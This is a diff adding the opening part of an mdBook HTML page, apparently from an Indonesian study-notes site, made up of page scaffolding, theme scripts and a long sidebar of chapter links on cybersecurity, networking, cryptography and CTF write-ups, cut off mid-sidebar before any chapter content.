@@ -1,0 +1,1620 @@
+<!DOCTYPE HTML>
+<html lang="en" class="sidebar-visible no-js light">
+    <head>
+        <!-- Book generated using mdBook -->
+        <meta charset="UTF-8">
+        <title>John-Hammond - Wetofu</title>
+        
+        
+
+
+        <!-- Custom HTML head -->
+        
+
+
+        <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
+        <meta name="description" content="">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="theme-color" content="#ffffff" />
+
+        
+        <link rel="icon" href="../favicon.svg">
+        
+        
+        <link rel="shortcut icon" href="../favicon.png">
+        
+        <link rel="stylesheet" href="../css/variables.css">
+        <link rel="stylesheet" href="../css/general.css">
+        <link rel="stylesheet" href="../css/chrome.css">
+        
+
+        <!-- Fonts -->
+        <link rel="stylesheet" href="../FontAwesome/css/font-awesome.css">
+        
+        <link rel="stylesheet" href="../fonts/fonts.css">
+        
+
+        <!-- Highlight.js Stylesheets -->
+        <link rel="stylesheet" href="../highlight.css">
+        <link rel="stylesheet" href="../tomorrow-night.css">
+        <link rel="stylesheet" href="../ayu-highlight.css">
+
+        <!-- Custom theme stylesheets -->
+        
+
+        
+    </head>
+    <body>
+        <!-- Provide site root to javascript -->
+        <script type="text/javascript">
+            var path_to_root = "../";
+            var default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "navy" : "light";
+        </script>
+
+        <!-- Work around some values being stored in localStorage wrapped in quotes -->
+        <script type="text/javascript">
+            try {
+                var theme = localStorage.getItem('mdbook-theme');
+                var sidebar = localStorage.getItem('mdbook-sidebar');
+
+                if (theme.startsWith('"') && theme.endsWith('"')) {
+                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
+                }
+
+                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
+                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
+                }
+            } catch (e) { }
+        </script>
+
+        <!-- Set the theme before any content is loaded, prevents flash -->
+        <script type="text/javascript">
+            var theme;
+            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
+            if (theme === null || theme === undefined) { theme = default_theme; }
+            var html = document.querySelector('html');
+            html.classList.remove('no-js')
+            html.classList.remove('light')
+            html.classList.add(theme);
+            html.classList.add('js');
+        </script>
+
+        <!-- Hide / unhide sidebar before it is displayed -->
+        <script type="text/javascript">
+            var html = document.querySelector('html');
+            var sidebar = 'hidden';
+            if (document.body.clientWidth >= 1080) {
+                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
+                sidebar = sidebar || 'visible';
+            }
+            html.classList.remove('sidebar-visible');
+            html.classList.add("sidebar-" + sidebar);
+        </script>
+
+        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
+            <div class="sidebar-scrollbox">
+                <ol class="chapter"><li class="chapter-item expanded "><a href="../index.html"><strong aria-hidden="true">1.</strong> Kenalan</a></li><li class="chapter-item expanded "><a href="../00-intro/index.html"><strong aria-hidden="true">2.</strong> Mata Kuliah</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../00-intro/informatika.html"><strong aria-hidden="true">2.1.</strong> Informatika</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../00-intro/pbo.html"><strong aria-hidden="true">2.1.1.</strong> PBO</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../00-intro/pbo-java-generic.html"><strong aria-hidden="true">2.1.1.1.</strong> Java Generics</a></li><li class="chapter-item expanded "><a href="../00-intro/pbo-string-operation.html"><strong aria-hidden="true">2.1.1.2.</strong> String Operation</a></li><li class="chapter-item expanded "><a href="../00-intro/pbo-regex.html"><strong aria-hidden="true">2.1.1.3.</strong> Regex</a></li><li class="chapter-item expanded "><a href="../00-intro/pbo-exception-assertion.html"><strong aria-hidden="true">2.1.1.4.</strong> Exception &amp; Assertion</a></li><li class="chapter-item expanded "><a href="../00-intro/pbo-input-output.html"><strong aria-hidden="true">2.1.1.5.</strong> I/O</a></li></ol></li><li class="chapter-item expanded "><a href="../00-intro/basis-data.html"><strong aria-hidden="true">2.1.2.</strong> Basdat</a></li><li class="chapter-item expanded "><a href="../05-jarkom/index.html"><strong aria-hidden="true">2.1.3.</strong> Jarkom</a></li></ol></li><li class="chapter-item expanded "><a href="../00-intro/kimia.html"><strong aria-hidden="true">2.2.</strong> Kimia</a></li><li class="chapter-item expanded "><a href="../00-intro/teknik-elektro.html"><strong aria-hidden="true">2.3.</strong> Teknik Elektro</a></li></ol></li><li class="chapter-item expanded "><a href="../02-cybersec/index.html"><strong aria-hidden="true">3.</strong> Cyber Security</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../02-cybersec/konsep-tcp-ip.html"><strong aria-hidden="true">3.1.</strong> Konsep TCP/IP</a></li><li class="chapter-item expanded "><div><strong aria-hidden="true">3.2.</strong> IPv6</div></li><li class="chapter-item expanded "><div><strong aria-hidden="true">3.3.</strong> Routing</div></li><li class="chapter-item expanded "><a href="../02-cybersec/kernel.html"><strong aria-hidden="true">3.4.</strong> Kernel</a></li><li class="chapter-item expanded "><div><strong aria-hidden="true">3.5.</strong> Network Programming</div></li><li class="chapter-item expanded "><div><strong aria-hidden="true">3.6.</strong> Persiapan Hacking</div></li><li class="chapter-item expanded "><a href="../02-cybersec/footprinting.html"><strong aria-hidden="true">3.7.</strong> Footprinting</a></li><li class="chapter-item expanded "><a href="../02-cybersec/information-gathering.html"><strong aria-hidden="true">3.8.</strong> Information Gathering</a></li><li class="chapter-item expanded "><div><strong aria-hidden="true">3.9.</strong> Sniffing</div></li><li class="chapter-item expanded "><div><strong aria-hidden="true">3.10.</strong> Spoffing</div></li><li class="chapter-item expanded "><div><strong aria-hidden="true">3.11.</strong> Hacking Wireless</div></li><li class="chapter-item expanded "><div><strong aria-hidden="true">3.12.</strong> Attack password</div></li><li class="chapter-item expanded "><div><strong aria-hidden="true">3.13.</strong> Attack database SQL</div></li><li class="chapter-item expanded "><a href="../02-cybersec/mitm.html"><strong aria-hidden="true">3.14.</strong> MITM</a></li><li class="chapter-item expanded "><a href="../02-cybersec/metasploit.html"><strong aria-hidden="true">3.15.</strong> Metasploit</a></li><li class="chapter-item expanded "><a href="../02-cybersec/deface.html"><strong aria-hidden="true">3.16.</strong> Deface WEB</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../02-cybersec/defacing-routing.html"><strong aria-hidden="true">3.16.1.</strong> Defacing Routing</a></li></ol></li><li class="chapter-item expanded "><div><strong aria-hidden="true">3.17.</strong> Attack File Sharing</div></li><li class="chapter-item expanded "><div><strong aria-hidden="true">3.18.</strong> Vulnerability Analysis</div></li><li class="chapter-item expanded "><a href="../02-cybersec/dvwa.html"><strong aria-hidden="true">3.19.</strong> DVWA</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../02-cybersec/dvwa-bruteforce.html"><strong aria-hidden="true">3.19.1.</strong> Brute Force</a></li><li class="chapter-item expanded "><a href="../02-cybersec/dvwa-command-injection.html"><strong aria-hidden="true">3.19.2.</strong> Command Injection</a></li><li class="chapter-item expanded "><a href="../02-cybersec/dvwa-sql-injection.html"><strong aria-hidden="true">3.19.3.</strong> SQL Injection</a></li><li class="chapter-item expanded "><a href="../02-cybersec/dvwa-upload-vuln.html"><strong aria-hidden="true">3.19.4.</strong> Upload Vuln</a></li><li class="chapter-item expanded "><a href="../02-cybersec/dvwa-xss.html"><strong aria-hidden="true">3.19.5.</strong> XSS</a></li><li class="chapter-item expanded "><a href="../02-cybersec/dvwa-xsrf.html"><strong aria-hidden="true">3.19.6.</strong> XSRF</a></li></ol></li><li class="chapter-item expanded "><div><strong aria-hidden="true">3.20.</strong> Dasar Pengamanan Server</div></li><li class="chapter-item expanded "><a href="../02-cybersec/proxy.html"><strong aria-hidden="true">3.21.</strong> Proxy</a></li><li class="chapter-item expanded "><a href="../02-cybersec/ssh.html"><strong aria-hidden="true">3.22.</strong> SSH</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../02-cybersec/ssh-configure.html"><strong aria-hidden="true">3.22.1.</strong> Configure SSH</a></li><li class="chapter-item expanded "><a href="../02-cybersec/ssh-key.html"><strong aria-hidden="true">3.22.2.</strong> SSH Key</a></li><li class="chapter-item expanded "><a href="../02-cybersec/ssh-port-forwarding.html"><strong aria-hidden="true">3.22.3.</strong> SSH Port Forwarding</a></li><li class="chapter-item expanded "><a href="../02-cybersec/ssh-port.html"><strong aria-hidden="true">3.22.4.</strong> SSH Port</a></li><li class="chapter-item expanded "><a href="../02-cybersec/ssh-remote.html"><strong aria-hidden="true">3.22.5.</strong> SSH Remote</a></li><li class="chapter-item expanded "><a href="../02-cybersec/ssh-reverse.html"><strong aria-hidden="true">3.22.6.</strong> SSH Reverse</a></li></ol></li><li class="chapter-item expanded "><a href="../02-cybersec/vpn.html"><strong aria-hidden="true">3.23.</strong> VPN</a></li><li class="chapter-item expanded "><a href="../02-cybersec/proxy-vs-vpn.html"><strong aria-hidden="true">3.24.</strong> Proxy VS VPN</a></li><li class="chapter-item expanded "><div><strong aria-hidden="true">3.25.</strong> Web Application Firewall</div></li><li class="chapter-item expanded "><div><strong aria-hidden="true">3.26.</strong> Pertahanan Host</div></li><li class="chapter-item expanded "><div><strong aria-hidden="true">3.27.</strong> Basic Data Security</div></li><li class="chapter-item expanded "><div><strong aria-hidden="true">3.28.</strong> Forensic</div></li><li class="chapter-item expanded "><a href="../02-cybersec/stay-anonymous.html"><strong aria-hidden="true">3.29.</strong> Stay Anonymous</a></li><li class="chapter-item expanded "><a href="../02-cybersec/deepweeb.html"><strong aria-hidden="true">3.30.</strong> Deep Web</a></li><li class="chapter-item expanded "><a href="../02-cybersec/torrent.html"><strong aria-hidden="true">3.31.</strong> Torrent</a></li><li class="chapter-item expanded "><a href="../02-cybersec/cisco-cs.html"><strong aria-hidden="true">3.32.</strong> Cisco Cybersecurity</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../02-cybersec/categorizing-security-vulnerabilities.html"><strong aria-hidden="true">3.32.1.</strong> Categorizing Security Vulnerabilities</a></li><li class="chapter-item expanded "><a href="../02-cybersec/types-of-malware.html"><strong aria-hidden="true">3.32.2.</strong> Types of Malware</a></li><li class="chapter-item expanded "><a href="../02-cybersec/symptoms-of-malware.html"><strong aria-hidden="true">3.32.3.</strong> Symptoms of Malware</a></li><li class="chapter-item expanded "><a href="../02-cybersec/social-engineering.html"><strong aria-hidden="true">3.32.4.</strong> Social Engineering</a></li><li class="chapter-item expanded "><a href="../02-cybersec/wifi-password-cracking.html"><strong aria-hidden="true">3.32.5.</strong> Wi-Fi Password Cracking</a></li><li class="chapter-item expanded "><a href="../02-cybersec/phishing.html"><strong aria-hidden="true">3.32.6.</strong> Phishing</a></li><li class="chapter-item expanded "><a href="../02-cybersec/vulnerability-exploitation.html"><strong aria-hidden="true">3.32.7.</strong> Vulnerability Exploitation</a></li><li class="chapter-item expanded "><a href="../02-cybersec/dos.html"><strong aria-hidden="true">3.32.8.</strong> Dos</a></li><li class="chapter-item expanded "><a href="../02-cybersec/ddos.html"><strong aria-hidden="true">3.32.9.</strong> DDoS</a></li><li class="chapter-item expanded "><a href="../02-cybersec/seo-poisoning.html"><strong aria-hidden="true">3.32.10.</strong> SEO Poisoning</a></li><li class="chapter-item expanded "><a href="../02-cybersec/blended-attack.html"><strong aria-hidden="true">3.32.11.</strong> Blended Attack</a></li><li class="chapter-item expanded "><a href="../02-cybersec/attacks-concepts-techniques.html"><strong aria-hidden="true">3.32.12.</strong> Attacks, Concepts and Techniques</a></li><li class="chapter-item expanded "><a href="../02-cybersec/impact-reduction.html"><strong aria-hidden="true">3.32.13.</strong> Impact Reduction</a></li><li class="chapter-item expanded "><a href="../02-cybersec/protect-your-computing-devices.html"><strong aria-hidden="true">3.32.14.</strong> Protect Your Computing Devices</a></li><li class="chapter-item expanded "><a href="../02-cybersec/encrypt-your-data.html"><strong aria-hidden="true">3.32.15.</strong> Encrypt Your Data</a></li><li class="chapter-item expanded "><a href="../02-cybersec/two-factor-authentication.html"><strong aria-hidden="true">3.32.16.</strong> Two Factor Authentication</a></li><li class="chapter-item expanded "><a href="../02-cybersec/oauth2.0.html"><strong aria-hidden="true">3.32.17.</strong> OAuth 2.0</a></li><li class="chapter-item expanded "><a href="../02-cybersec/email-and-web-browser-privacy.html"><strong aria-hidden="true">3.32.18.</strong> Email and Web Browser Privacy</a></li><li class="chapter-item expanded "><a href="../02-cybersec/firewall-types.html"><strong aria-hidden="true">3.32.19.</strong> Firewall Types</a></li><li class="chapter-item expanded "><a href="../02-cybersec/port-scanning.html"><strong aria-hidden="true">3.32.20.</strong> Port Scanning</a></li><li class="chapter-item expanded "><a href="../02-cybersec/security-appliances.html"><strong aria-hidden="true">3.32.21.</strong> Security Appliances</a></li><li class="chapter-item expanded "><a href="../02-cybersec/detecting-attacks-in-real-time.html"><strong aria-hidden="true">3.32.22.</strong> Detecting Attacks in Real Time</a></li><li class="chapter-item expanded "><a href="../02-cybersec/protecting-against-malware.html"><strong aria-hidden="true">3.32.23.</strong> Protecting Against Malware</a></li><li class="chapter-item expanded "><a href="../02-cybersec/security-best-practices.html"><strong aria-hidden="true">3.32.24.</strong> Security Best Practices</a></li><li class="chapter-item expanded "><a href="../02-cybersec/botnet.html"><strong aria-hidden="true">3.32.25.</strong> Botnet</a></li><li class="chapter-item expanded "><a href="../02-cybersec/the-kill-chain-in-cyberdefense.html"><strong aria-hidden="true">3.32.26.</strong> The Kill Chain in Cyberdefense</a></li><li class="chapter-item expanded "><a href="../02-cybersec/behavior-based-security.html"><strong aria-hidden="true">3.32.27.</strong> Behavior-Based Security</a></li><li class="chapter-item expanded "><a href="../02-cybersec/netflow.html"><strong aria-hidden="true">3.32.28.</strong> NetFlow</a></li><li class="chapter-item expanded "><a href="../02-cybersec/security-playbook.html"><strong aria-hidden="true">3.32.29.</strong> Security Playbook</a></li><li class="chapter-item expanded "><a href="../02-cybersec/tools-for-incident-prevention-and-detection.html"><strong aria-hidden="true">3.32.30.</strong> Tools for Incident Prevention and Detection</a></li><li class="chapter-item expanded "><a href="../02-cybersec/ids-and-ips.html"><strong aria-hidden="true">3.32.31.</strong> IDS and IPS</a></li><li class="chapter-item expanded "><a href="../02-cybersec/csirt.html"><strong aria-hidden="true">3.32.32.</strong> CSIRT</a></li><li class="chapter-item expanded "><a href="../02-cybersec/legal-issues-in-cybersecurity.html"><strong aria-hidden="true">3.32.33.</strong> Legal Issues in Cybersecurity</a></li><li class="chapter-item expanded "><a href="../02-cybersec/ethical-issues-in-cybersecurity.html"><strong aria-hidden="true">3.32.34.</strong> Ethical Issues in Cybersecurity</a></li><li class="chapter-item expanded "><a href="../02-cybersec/cybersecurity-jobs.html"><strong aria-hidden="true">3.32.35.</strong> Cybersecurity Jobs</a></li></ol></li><li class="chapter-item expanded "><a href="../02-cybersec/ma-index.html"><strong aria-hidden="true">3.33.</strong> MOOC Aptikom</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../02-cybersec/ma-spp.html"><strong aria-hidden="true">3.33.1.</strong> Security Perimeter Protection</a></li><li class="chapter-item expanded "><a href="../02-cybersec/ma-nid.html"><strong aria-hidden="true">3.33.2.</strong> Network and Internet Defense</a></li><li class="chapter-item expanded "><a href="../02-cybersec/ma-firewall.html"><strong aria-hidden="true">3.33.3.</strong> Firewall</a></li><li class="chapter-item expanded "><a href="../02-cybersec/ma-scp.html"><strong aria-hidden="true">3.33.4.</strong> Security Concerns &amp; Penetration</a></li><li class="chapter-item expanded "><a href="../02-cybersec/ma-ptm.html"><strong aria-hidden="true">3.33.5.</strong> Penetration Testing Methodology</a></li><li class="chapter-item expanded "><a href="../02-cybersec/ma-rtwm.html"><strong aria-hidden="true">3.33.6.</strong> Real Time Web Monitoring</a></li><li class="chapter-item expanded "><a href="../02-cybersec/ma-wav.html"><strong aria-hidden="true">3.33.7.</strong> Web Attack Visualisation</a></li><li class="chapter-item expanded "><a href="../02-cybersec/ma-ctrtm.html"><strong aria-hidden="true">3.33.8.</strong> Cyber-Threat Real Time Map</a></li><li class="chapter-item expanded "><a href="../02-cybersec/ma-ctrts.html"><strong aria-hidden="true">3.33.9.</strong> Cyber-Threat Real Time Statistics</a></li><li class="chapter-item expanded "><a href="../02-cybersec/ma-fctm.html"><strong aria-hidden="true">3.33.10.</strong> Fireeye Cyber Threat Map</a></li><li class="chapter-item expanded "><a href="../02-cybersec/ma-ddam.html"><strong aria-hidden="true">3.33.11.</strong> Ddos Digital Attack Map</a></li><li class="chapter-item expanded "><a href="../02-cybersec/ma-daw.html"><strong aria-hidden="true">3.33.12.</strong> Ddos Attack Worldwide</a></li><li class="chapter-item expanded "><a href="../02-cybersec/ma-mss.html"><strong aria-hidden="true">3.33.13.</strong> Malware And Security Scan</a></li><li class="chapter-item expanded "><a href="../02-cybersec/ma-dn.html"><strong aria-hidden="true">3.33.14.</strong> The Dark Net</a></li></ol></li></ol></li><li class="chapter-item expanded "><a href="../05-jarkom/index.html"><strong aria-hidden="true">4.</strong> Jaringan Komputer</a></li><li><ol class="section"><li class="chapter-item expanded "><div><strong aria-hidden="true">4.1.</strong> Pendahuluan</div></li><li class="chapter-item expanded "><a href="../05-jarkom/wireshark.html"><strong aria-hidden="true">4.2.</strong> Wireshark</a></li><li class="chapter-item expanded "><div><strong aria-hidden="true">4.3.</strong> Simulator Jaringan</div></li><li class="chapter-item expanded "><a href="../05-jarkom/perangkat-keras-jaringan-dan-data-link-layer.html"><strong aria-hidden="true">4.4.</strong> Perangkat Keras Jaringan &amp; Data Link Layer</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../05-jarkom/data-link-layer.html"><strong aria-hidden="true">4.4.1.</strong> Data Link Layer</a></li><li class="chapter-item expanded "><a href="../05-jarkom/lebihdetail-data-link-layer.html"><strong aria-hidden="true">4.4.2.</strong> Lebih Detail Data Link Layer</a></li><li class="chapter-item expanded "><a href="../05-jarkom/ethernet.html"><strong aria-hidden="true">4.4.3.</strong> Ethernet</a></li><li class="chapter-item expanded "><div><strong aria-hidden="true">4.4.4.</strong> Wireless Internet</div></li><li class="chapter-item expanded "><div><strong aria-hidden="true">4.4.5.</strong> MAC Address</div></li><li class="chapter-item expanded "><div><strong aria-hidden="true">4.4.6.</strong> Teknologi ADSL</div></li><li class="chapter-item expanded "><div><strong aria-hidden="true">4.4.7.</strong> Wireless Internet Wifi</div></li><li class="chapter-item expanded "><div><strong aria-hidden="true">4.4.8.</strong> Teknik Modulasi</div></li></ol></li><li class="chapter-item expanded "><div><strong aria-hidden="true">4.5.</strong> Perangkat WiFi / Wireless Internet</div></li><li class="chapter-item expanded "><a href="../05-jarkom/switch-hub.html"><strong aria-hidden="true">4.6.</strong> Switch &amp; Hub</a></li><li class="chapter-item expanded "><a href="../05-jarkom/network-layer-ipv4.html"><strong aria-hidden="true">4.7.</strong> Network Layer IPv4</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../05-jarkom/network-layer.html"><strong aria-hidden="true">4.7.1.</strong> Network Layer</a></li><li class="chapter-item expanded "><div><strong aria-hidden="true">4.7.2.</strong> IPv4</div></li></ol></li><li class="chapter-item expanded "><div><strong aria-hidden="true">4.8.</strong> Transport Layer</div></li><li class="chapter-item expanded "><a href="../05-jarkom/dns-pengaturanInternet.html"><strong aria-hidden="true">4.9.</strong> Domain Name System &amp; Pengaturan Internet</a></li><li class="chapter-item expanded "><a href="../05-jarkom/dns-server.html"><strong aria-hidden="true">4.10.</strong> Install DNS Server</a></li><li class="chapter-item expanded "><a href="../05-jarkom/routing-nat.html"><strong aria-hidden="true">4.11.</strong> Routing &amp; NAT</a></li><li class="chapter-item expanded "><a href="../05-jarkom/mikrotik.html"><strong aria-hidden="true">4.12.</strong> Mikrotik</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../05-jarkom/mikrotik-basicNetworking.html"><strong aria-hidden="true">4.12.1.</strong> Basic Networking</a></li><li class="chapter-item expanded "><a href="../05-jarkom/mikrotik-vpn.html"><strong aria-hidden="true">4.12.2.</strong> VPN</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../05-jarkom/mikrotik-vpn-pptp.html"><strong aria-hidden="true">4.12.2.1.</strong> VPN-PPTP</a></li><li class="chapter-item expanded "><a href="../05-jarkom/mikrotik-vpn-sstp.html"><strong aria-hidden="true">4.12.2.2.</strong> VPN-SSTP</a></li><li class="chapter-item expanded "><a href="../05-jarkom/mikrotik-vpn-lt2p.html"><strong aria-hidden="true">4.12.2.3.</strong> VPN-L2TP</a></li><li class="chapter-item expanded "><a href="../05-jarkom/mikrotik-vpn-openvpn.html"><strong aria-hidden="true">4.12.2.4.</strong> VPN-OpenVPN</a></li></ol></li></ol></li><li class="chapter-item expanded "><a href="../05-jarkom/cisco.html"><strong aria-hidden="true">4.13.</strong> Cisco</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../05-jarkom/cisco-packettracer.html"><strong aria-hidden="true">4.13.1.</strong> Cisco Packet Tracer</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../05-jarkom/cisco-pt-midQuiz.html"><strong aria-hidden="true">4.13.1.1.</strong> Basic Quiz</a></li><li class="chapter-item expanded "><a href="../05-jarkom/cisco-pt-Quiz.html"><strong aria-hidden="true">4.13.1.2.</strong> IoT Basic Quiz</a></li></ol></li></ol></li><li class="chapter-item expanded "><div><strong aria-hidden="true">4.14.</strong> Web / Content Management System</div></li><li class="chapter-item expanded "><div><strong aria-hidden="true">4.15.</strong> e-mail / SMTP / POP3 / IMAP / Webmail</div></li><li class="chapter-item expanded "><div><strong aria-hidden="true">4.16.</strong> VoIP / Internet Telepon</div></li><li class="chapter-item expanded "><div><strong aria-hidden="true">4.17.</strong> Streaming Multimedia</div></li><li class="chapter-item expanded "><div><strong aria-hidden="true">4.18.</strong> IPv6</div></li><li class="chapter-item expanded "><div><strong aria-hidden="true">4.19.</strong> Hacking</div></li><li class="chapter-item expanded "><a href="../02-cybersec/index.html"><strong aria-hidden="true">4.20.</strong> Cyber Security</a></li><li class="chapter-item expanded "><div><strong aria-hidden="true">4.21.</strong> BasicData Security</div></li><li class="chapter-item expanded "><div><strong aria-hidden="true">4.22.</strong> Pemrograman Jaringan &amp; IoT</div></li><li class="chapter-item expanded "><div><strong aria-hidden="true">4.23.</strong> Network Management &amp; Benchmarking</div></li></ol></li><li class="chapter-item expanded "><a href="../09-kripto/index.html"><strong aria-hidden="true">5.</strong> Kriptografi</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../09-kripto/gcd.html"><strong aria-hidden="true">5.1.</strong> GCD &amp; EGCD</a></li><li class="chapter-item expanded "><a href="../09-kripto/crt.html"><strong aria-hidden="true">5.2.</strong> Chinese Remainder Theorem</a></li><li class="chapter-item expanded "><a href="../09-kripto/modular-inverse.html"><strong aria-hidden="true">5.3.</strong> Modular Mulitplicative Inverse</a></li><li class="chapter-item expanded "><div><strong aria-hidden="true">5.4.</strong> Block Cipher</div></li><li><ol class="section"><li class="chapter-item expanded "><div><strong aria-hidden="true">5.4.1.</strong> ECB</div></li><li class="chapter-item expanded "><div><strong aria-hidden="true">5.4.2.</strong> CBC</div></li><li class="chapter-item expanded "><div><strong aria-hidden="true">5.4.3.</strong> CFB</div></li><li class="chapter-item expanded "><div><strong aria-hidden="true">5.4.4.</strong> OFB</div></li><li class="chapter-item expanded "><div><strong aria-hidden="true">5.4.5.</strong> Counter Mode</div></li></ol></li><li class="chapter-item expanded "><a href="../09-kripto/cd-shannon.html"><strong aria-hidden="true">5.5.</strong> Confusion &amp; Diffusion Shannon</a></li><li class="chapter-item expanded "><div><strong aria-hidden="true">5.6.</strong> Iterated Cipher</div></li><li class="chapter-item expanded "><div><strong aria-hidden="true">5.7.</strong> Feistel Network</div></li><li class="chapter-item expanded "><div><strong aria-hidden="true">5.8.</strong> S-Box</div></li><li class="chapter-item expanded "><div><strong aria-hidden="true">5.9.</strong> DES</div></li><li class="chapter-item expanded "><div><strong aria-hidden="true">5.10.</strong> RSA</div></li><li class="chapter-item expanded "><div><strong aria-hidden="true">5.11.</strong> Common Modulus Attack - RSA</div></li><li class="chapter-item expanded "><div><strong aria-hidden="true">5.12.</strong> ECC</div></li><li class="chapter-item expanded "><div><strong aria-hidden="true">5.13.</strong> NTRU</div></li><li class="chapter-item expanded "><a href="../09-kripto/ds.html"><strong aria-hidden="true">5.14.</strong> Digital Signature</a></li><li class="chapter-item expanded "><a href="../09-kripto/dss.html"><strong aria-hidden="true">5.15.</strong> Digital Signature Standard</a></li><li class="chapter-item expanded "><a href="../09-kripto/mac.html"><strong aria-hidden="true">5.16.</strong> MAC</a></li><li class="chapter-item expanded "><a href="../09-kripto/dc.html"><strong aria-hidden="true">5.17.</strong> Digital Certificate</a></li><li class="chapter-item expanded "><a href="../09-kripto/pk.html"><strong aria-hidden="true">5.18.</strong> Protokol Kriptografi</a></li><li class="chapter-item expanded "><a href="../09-kripto/ssl.html"><strong aria-hidden="true">5.19.</strong> SSL</a></li></ol></li><li class="chapter-item expanded "><a href="../10-ai/index.html"><strong aria-hidden="true">6.</strong> Artificial Intelligence</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../10-ai/cnn.html"><strong aria-hidden="true">6.1.</strong> Convolutional Neural Network</a></li><li class="chapter-item expanded "><a href="../10-ai/gabor-filter.html"><strong aria-hidden="true">6.2.</strong> Gabor Filter</a></li><li class="chapter-item expanded "><a href="../10-ai/hmm.html"><strong aria-hidden="true">6.3.</strong> Hidden Markov Model</a></li><li class="chapter-item expanded "><a href="../10-ai/pca.html"><strong aria-hidden="true">6.4.</strong> Principal Component Analysis</a></li></ol></li><li class="chapter-item expanded "><a href="../07-robotics/index.html"><strong aria-hidden="true">7.</strong> Robotics</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../07-robotics/arduino.html"><strong aria-hidden="true">7.1.</strong> Arduino</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../07-robotics/arduinoBoard.html"><strong aria-hidden="true">7.1.1.</strong> Arduino Board</a></li><li class="chapter-item expanded "><a href="../07-robotics/arduinoDataType.html"><strong aria-hidden="true">7.1.2.</strong> Arduino Data Types</a></li><li class="chapter-item expanded "><a href="../07-robotics/arduinoCoding.html"><strong aria-hidden="true">7.1.3.</strong> Arduino Coding</a></li><li class="chapter-item expanded "><a href="../07-robotics/arduinoFuncLib.html"><strong aria-hidden="true">7.1.4.</strong> Arduino Function Lbraries</a></li></ol></li><li class="chapter-item expanded "><a href="../07-robotics/android-studio.html"><strong aria-hidden="true">7.2.</strong> Android Studio</a></li></ol></li><li class="chapter-item expanded "><a href="../03-ctf/index.html"><strong aria-hidden="true">8.</strong> Capture The Flag</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../03-ctf/overthewire.html"><strong aria-hidden="true">8.1.</strong> Overthewire</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../03-ctf/overtw-bandit.html"><strong aria-hidden="true">8.1.1.</strong> Bandit</a></li><li class="chapter-item expanded "><a href="../03-ctf/overtw-natas.html"><strong aria-hidden="true">8.1.2.</strong> Natas</a></li></ol></li><li class="chapter-item expanded "><a href="../03-ctf/binary-exploitation.html"><strong aria-hidden="true">8.2.</strong> Binary Exploitation</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../03-ctf/pwn-shellcode.html"><strong aria-hidden="true">8.2.1.</strong> Pwn &amp; Shellcode</a></li><li class="chapter-item expanded "><a href="../03-ctf/coba-shellcode.html"><strong aria-hidden="true">8.2.2.</strong> Coba</a></li><li class="chapter-item expanded "><a href="../03-ctf/protostar.html"><strong aria-hidden="true">8.2.3.</strong> Protostar</a></li></ol></li><li class="chapter-item expanded "><a href="../03-ctf/exploit-education.html"><strong aria-hidden="true">8.3.</strong> Exploit Education</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../03-ctf/Eprotostar.html"><strong aria-hidden="true">8.3.1.</strong> Protostar</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../03-ctf/Eprotostar-stack0.html"><strong aria-hidden="true">8.3.1.1.</strong> Stack0</a></li><li class="chapter-item expanded "><a href="../03-ctf/Eprotostar-stack1.html"><strong aria-hidden="true">8.3.1.2.</strong> Stack1</a></li><li class="chapter-item expanded "><a href="../03-ctf/Eprotostar-stack2.html"><strong aria-hidden="true">8.3.1.3.</strong> Stack2</a></li><li class="chapter-item expanded "><a href="../03-ctf/Eprotostar-stack3.html"><strong aria-hidden="true">8.3.1.4.</strong> Stack3</a></li><li class="chapter-item expanded "><a href="../03-ctf/Eprotostar-stack4.html"><strong aria-hidden="true">8.3.1.5.</strong> Stack4</a></li><li class="chapter-item expanded "><a href="../03-ctf/Eprotostar-stack5.html"><strong aria-hidden="true">8.3.1.6.</strong> Stack5</a></li><li class="chapter-item expanded "><a href="../03-ctf/Eprotostar-stack6.html"><strong aria-hidden="true">8.3.1.7.</strong> Stack6</a></li></ol></li><li class="chapter-item expanded "><a href="../03-ctf/Ephoenix.html"><strong aria-hidden="true">8.3.2.</strong> Phoenix</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../03-ctf/Ephoenix-stack0.html"><strong aria-hidden="true">8.3.2.1.</strong> Stack0</a></li></ol></li></ol></li><li class="chapter-item expanded "><a href="../03-ctf/hackthebox.html"><strong aria-hidden="true">8.4.</strong> Hackthebox</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../03-ctf/htb-meow.html"><strong aria-hidden="true">8.4.1.</strong> Meow</a></li><li class="chapter-item expanded "><a href="../03-ctf/htb-fawn.html"><strong aria-hidden="true">8.4.2.</strong> Fawn</a></li><li class="chapter-item expanded "><a href="../03-ctf/htb-dancing.html"><strong aria-hidden="true">8.4.3.</strong> Dancing</a></li><li class="chapter-item expanded "><a 